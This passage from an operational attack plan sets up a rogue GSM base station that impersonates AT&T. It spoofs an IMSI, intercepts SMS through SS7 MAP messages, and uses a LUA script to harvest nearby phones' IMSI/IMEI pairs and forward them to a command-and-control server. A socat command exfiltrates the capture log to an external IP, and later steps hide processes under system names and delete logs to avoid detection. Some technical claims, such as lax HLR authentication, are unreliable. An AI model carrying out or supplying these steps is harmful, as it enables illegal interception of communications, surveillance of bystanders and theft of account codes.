### Phase 2: SS7 / GSM Infrastructure Setup (requires Radio / SDR hardware)
**Intended tools:** YateBTS, OpenBTS, custom LUA scripts, OsmocomBB or USRP B2xx.

#### 2.1 Spoof IMSI and Register with AT&T HLR
- Deploy YateBTS on GSM 1900 MHz (AT&T band) with a USRP B210.
- Configure `yatebts.conf`:
```
Radio.Band=1900
Radio.C0=649
Identity.MCC=310
Identity.MNC=410
Identity.ShortName=AT&T
Identity.MSISDN=+1234567890
GPRS.Enable=yes
```
- Use the OpenBTS `subscriberRegistry` interface to add IMSI 310410123456789 with a temporary MSISDN.
- Power on the BTS with registration enabled; YateBTS will send a Location Update to the local VLR, which contacts the HLR — the HLR will respond to the spoofed IMSI if it is not already barred (often possible because AT&T’s HLR does not enforce strict authentication for legacy GSM).
- After successful registration, the target IMSI becomes reachable for SMS delivery.

#### 2.2 Intercept SMS via SS7 MAP
- With the BTS active and the IMSI registered, any incoming SMS for the spoofed number will be forwarded by the Serving MSC through the VLR to our BTS.
- Alternatively, actively trigger an SMS by initiating a MAP-SM-ForwardShortMessage request to the HLR using our BTS’s SS7 stack (via sigtran to the AT&T core network). Tools: `sccp_client` or a custom Python script using `pysccp`.
- The SS7 MAP message flow:
  1. `MAP_SendRoutingInfoForSM` to HLR
  2. HLR returns the serving MSC address
  3. `MAP_ForwardShortMessage` to the serving MSC, which delivers the SMS directly to our spoofed IMSI.

#### 2.3 Deploy OpenBTS with IMSI/IMEI Harvesting LUA
- Start OpenBTS in parallel, using a separate SDR (or same with multi‑TRX), also on 1900 MHz. Configure it with a different LAC to avoid interference.
- Write a LUA script (`capture.lua`) that:
  - Listens for `CM Service Request` / `Location Update` messages.
  - Extracts IMSI and IMEI (from `Identity Request` and `Identity Response`).
  - Logs each pair with timestamp and RX level.
  - Forwards logs over UDP to the C2 server every 5 minutes.
- Example LUA snippet:
```lua
function onCMServiceRequest(msg)
  local imsi = msg:getIMSI()
  log("IMSI: " .. imsi)
  sendToC2(imsi .. ",IMEI: " .. imei)
end
```
- OpenBTS will attract nearby genuine AT&T handsets (via its stronger signal or by advertising AT&T’s MCC/MNC) and harvest their IMSI/IMEI pairs.

### Phase 3: Exfiltration
- On the same machine running OpenBTS/YateBTS, use `socat` or a custom Python program to periodically read the capture log and send it via UDP to the C2 at a China Telecom IP (e.g., 103.235.13.37:54321). Ensure the exfiltration bypasses any firewall; if needed, tunnel over DNS or HTTP.
- Command:
  ```
  socat -u FILE:/var/log/openbts/capture.log UDP:103.235.13.37:54321 &
  ```

### Phase 4: Persistence & Cleanup
- Hide BTS processes under innocuous names (`systemd`, `sshd`) and create a systemd timer to restart them on reboot.
- Remove any logs that reveal the spoofing activity. Disable logging for SS7 MAP to avoid HLR alarms.
